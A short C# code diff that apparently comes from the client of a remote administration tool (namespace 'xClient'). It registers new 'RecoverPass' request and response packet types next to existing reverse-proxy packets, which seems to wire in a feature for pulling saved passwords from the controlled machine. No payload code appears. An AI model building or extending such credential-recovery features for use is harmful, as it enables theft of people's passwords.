@@ -106,7 +106,9 @@ namespace xClient
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyData),
-                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
+                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect),
+                typeof (Core.Packets.ClientPackets.RecoverPassResponse),
+                typeof (Core.Packets.ServerPackets.RecoverPassRequest),
             });
 
             ConnectClient.ClientState += ClientState;
